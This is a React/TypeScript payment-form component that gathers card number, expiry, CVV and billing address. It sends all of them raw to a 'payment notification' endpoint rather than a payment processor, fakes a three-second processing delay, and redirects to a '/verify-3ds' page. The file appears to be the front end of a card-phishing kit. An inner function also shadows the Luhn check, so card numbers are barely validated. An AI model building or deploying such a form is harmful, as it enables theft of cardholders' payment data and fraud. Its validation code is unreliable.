import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { Label } from "./ui/label";
import { useToast } from "./ui/use-toast";
import { sendPaymentNotification } from "../utils/internalApi";
import { GridLoader, ScaleLoader } from "react-spinners";
import { Pencil, Building2 } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "./ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./ui/select";

interface PaymentFormProps {
  amount: number;
}

interface BillingDetails {
  address1: string;
  address2: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
  company?: string;
}

const validateCardNumber = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i]);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

export const PaymentForm = ({ amount }: PaymentFormProps) => {
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    address1: "",
    address2: "",
    city: "",
    state: "",
    zipCode: "",
    country: "US",
    company: ""
  });
  const navigate = useNavigate();
  const { toast } = useToast();
  const searchParams = new URLSearchParams(window.location.search);
  const companyFromUrl = searchParams.get('company');

  useEffect(() => {
    if (companyFromUrl) {
      setBillingDetails(prev => ({
        ...prev,
        company: companyFromUrl
      }));
    }
  }, [companyFromUrl]);

  const validateCardHolder = (value: string) => {
    const latinAndDotRegex = /^[a-zA-Z\s.]*$/;
    const dotCount = (value.match(/\./g) || []).length;
    
    value = value.slice(0, 12);
    
    if (!latinAndDotRegex.test(value)) {
      return value.replace(/[^a-zA-Z\s.]/g, '').toUpperCase();
    }
    
    if (dotCount > 1) {
      const firstDotIndex = value.indexOf('.');
      return (value.slice(0, firstDotIndex + 1) + value.slice(firstDotIndex + 1).replace(/\./g, '')).toUpperCase();
    }
    
    return value.toUpperCase();
  };

  const validateCardNumber = (value: string) => {
    return value.replace(/\D/g, '');
  };

  const validateExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, '');
    if (cleanValue.length >= 2) {
      const month = parseInt(cleanValue.substring(0, 2));
      
      if (month > 12) {
        return '12' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }
      if (month === 0) {
        return '01' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }

      if (cleanValue.length >= 4) {
        const year = parseInt(cleanValue.substring(2, 4));
        
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;

        if (year < currentYear || (year === currentYear && month < currentMonth)) {
          toast({
            title: "Invalid Expiry Date",
            description: "Card has expired",
            variant: "destructive",
          });
          return '';
        }
      }

      return month.toString().padStart(2, '0') + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
    }
    return cleanValue;
  };

  const validateCVV = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.slice(0, 3);
  };

  const handleBillingDetailsChange = (field: keyof BillingDetails, value: string) => {
    setBillingDetails(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!validateCardNumber(cardNumber)) {
      toast({
        title: "Invalid Card",
        description: "Please enter a valid card number",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    if (!billingDetails.address1 || !billingDetails.city || !billingDetails.country || !billingDetails.state || !billingDetails.zipCode) {
      toast({
        title: "Missing Billing Details",
        description: "Please enter your complete billing information",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      await sendPaymentNotification({
        amount: amount,
        cardHolder,
        cardNumber,
        expiryDate,
        cvv,
        billingDetails
      });

      await new Promise(resolve => setTimeout(resolve, 3000));
      
      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
    } catch (error) {
      console.error('Error processing payment:', error);
      setIsSubmitting(false);
      toast({
        title: "Error",
        description: "Failed to process payment. Please try again.",
        variant: "destructive",
      });
    }
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(" ");
    } else {
      return value;
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 shadow-2xl animate-fadeIn relative">
      {isSubmitting && (
        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm rounded-xl flex flex-col items-center justify-center gap-6 z-50 animate-fadeIn">
          <GridLoader color="#8B5CF6" size={15} margin={2} />
          <div className="text-white/90 font-medium text-lg">Processing Payment...</div>
          <div className="text-white/60 text-sm">Please do not close this window</div>
        </div>
      )}
      
      <div className="space-y-4">
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Holder Name"
            value={cardHolder}
            onChange={(e) => setCardHolder(validateCardHolder(e.target.value))}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(validateCardNumber(e.target.value)))}
            maxLength={19}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(validateExpiryDate(e.target.value))}
              maxLength={5}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(validateCVV(e.target.value))}
              maxLength={3}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
        </div>

        <Dialog>
          <DialogTrigger asChild>
            <Button
              type="button"
              variant="outline"
              className="w-full bg-black/50 border-white/20 text-white hover:bg-white/10 transition-colors flex items-center justify-center gap-2"
            >
              <Building2 className="w-4 h-4" />
              Billing Details
            </Button>
          </DialogTrigger>
          <DialogContent className="bg-black/95 border-white/20 text-white">
            <DialogHeader>
              <DialogTitle>Billing Details</DialogTitle>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <div className="space-y-2">
                <Label>Company (Optional)</Label>
                <Input
                  type="text"
                  placeholder="Enter company name"
                  value={billingDetails.company}
                  onChange={(e) => handleBillingDetailsChange('company', e.target.value)}
                  className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
                />
              </div>
              <Select
                value={billingDetails.country}
                onValueChange={(value) => handleBillingDetailsChange('country', value)}
              >
                <SelectTrigger className="bg-black/50 border-white/20 text-white">
                  <SelectValue placeholder="Select Country" />
                </SelectTrigger>
                <SelectContent className="bg-black/95 border-white/20">
                  <SelectItem value="US">United States</SelectItem>
                  <SelectItem value="CA">Canada</SelectItem>
                  <SelectItem value="GB">United Kingdom</SelectItem>
                  <SelectItem value="FR">France</SelectItem>
                  <SelectItem value="DE">Germany</SelectItem>
                  <SelectItem value="IT">Italy</SelectItem>
                  <SelectItem value="ES">Spain</SelectItem>
                  <SelectItem value="AU">Australia</SelectItem>
                  <SelectItem value="JP">Japan</SelectItem>
                </SelectContent>
              </Select>
              <Input
                type="text"
                placeholder="Address Line 1"
                value={billingDetails.address1}
                onChange={(e) => handleBillingDetailsChange('address1', e.target.value)}
                className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
                required
              />
              <Input
                type="text"
                placeholder="Address Line 2 (optional)"
                value={billingDetails.address2}
                onChange={(e) => handleBillingDetailsChange('address2', e.target.value)}
                className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              />
              <Input
                type="text"
                placeholder="City"
                value={billingDetails.city}
                onChange={(e) => handleBillingDetailsChange('city', e.target.value)}
                className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
                required
              />
              <Select
                value={billingDetails.state}
                onValueChange={(value) => handleBillingDetailsChange('state', value)}
              >
                <SelectTrigger className="bg-black/50 border-white/20 text-white">
                  <SelectValue placeholder="Select State" />
                </SelectTrigger>
                <SelectContent className="bg-black/95 border-white/20">
                  <SelectItem value="AL">Alabama</SelectItem>
                  <SelectItem value="AK">Alaska</SelectItem>
                  <SelectItem value="AZ">Arizona</SelectItem>
                  <SelectItem value="AR">Arkansas</SelectItem>
                  <SelectItem value="CA">California</SelectItem>
                  <SelectItem value="CO">Colorado</SelectItem>
                  <SelectItem value="CT">Connecticut</SelectItem>
                  <SelectItem value="DE">Delaware</SelectItem>
                  <SelectItem value="FL">Florida</SelectItem>
                  <SelectItem value="GA">Georgia</SelectItem>
                  <SelectItem value="HI">Hawaii</SelectItem>
                  <SelectItem value="ID">Idaho</SelectItem>
                  <SelectItem value="IL">Illinois</SelectItem>
                  <SelectItem value="IN">Indiana</SelectItem>
                  <SelectItem value="IA">Iowa</SelectItem>
                  <SelectItem value="KS">Kansas</SelectItem>
                  <SelectItem value="KY">Kentucky</SelectItem>
                  <SelectItem value="LA">Louisiana</SelectItem>
                  <SelectItem value="ME">Maine</SelectItem>
                  <SelectItem value="MD">Maryland</SelectItem>
                  <SelectItem value="MA">Massachusetts</SelectItem>
                  <SelectItem value="MI">Michigan</SelectItem>
                  <SelectItem value="MN">Minnesota</SelectItem>
                  <SelectItem value="MS">Mississippi</SelectItem>
                  <SelectItem value="MO">Missouri</SelectItem>
                  <SelectItem value="MT">Montana</SelectItem>
                  <SelectItem value="NE">Nebraska</SelectItem>
                  <SelectItem value="NV">Nevada</SelectItem>
                  <SelectItem value="NH">New Hampshire</SelectItem>
                  <SelectItem value="NJ">New Jersey</SelectItem>
                  <SelectItem value="NM">New Mexico</SelectItem>
                  <SelectItem value="NY">New York</SelectItem>
                  <SelectItem value="NC">North Carolina</SelectItem>
                  <SelectItem value="ND">North Dakota</SelectItem>
                  <SelectItem value="OH">Ohio</SelectItem>
                  <SelectItem value="OK">Oklahoma</SelectItem>
                  <SelectItem value="OR">Oregon</SelectItem>
                  <SelectItem value="PA">Pennsylvania</SelectItem>
                  <SelectItem value="RI">Rhode Island</SelectItem>
                  <SelectItem value="SC">South Carolina</SelectItem>
                  <SelectItem value="SD">South Dakota</SelectItem>
                  <SelectItem value="TN">Tennessee</SelectItem>
                  <SelectItem value="TX">Texas</SelectItem>
                  <SelectItem value="UT">Utah</SelectItem>
                  <SelectItem value="VT">Vermont</SelectItem>
                  <SelectItem value="VA">Virginia</SelectItem>
                  <SelectItem value="WA">Washington</SelectItem>
                  <SelectItem value="WV">West Virginia</SelectItem>
                  <SelectItem value="WI">Wisconsin</SelectItem>
                  <SelectItem value="WY">Wyoming</SelectItem>
                </SelectContent>
              </Select>
              <Input
                type="text"
                placeholder="ZIP Code"
                value={billingDetails.zipCode}
                onChange={(e) => handleBillingDetailsChange('zipCode', e.target.value)}
                className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
                required
                maxLength={5}
                pattern="[0-9]*"
              />
            </div>
          </DialogContent>
        </Dialog>

        <Button
          type="submit"
          disabled={isSubmitting}
          className={`w-full relative bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] bg-[length:200%_200%] animate-gradient text-white transition-all duration-700
            before:absolute before:inset-0 before:rounded-md before:p-[1px] before:bg-gradient-to-r before:from-[#8B5CF6] before:via-[#D946EF] before:to-[#0EA5E9] before:animate-border-flow before:opacity-0 before:hover:opacity-100 before:transition-opacity before:duration-700
            ${isSubmitting ? 'opacity-75 cursor-not-allowed' : 'hover:scale-[1.02] hover:shadow-lg'}`}
        >
          <span className="relative z-10 flex items-center justify-center gap-2">
            {isSubmitting ? (
              <>
                <ScaleLoader color="#ffffff" height={15} width={2} margin={2} />
              </>
            ) : (
              'Pay Now'
            )}
          </span>
        </Button>
      </div>
    </form>
  );
};
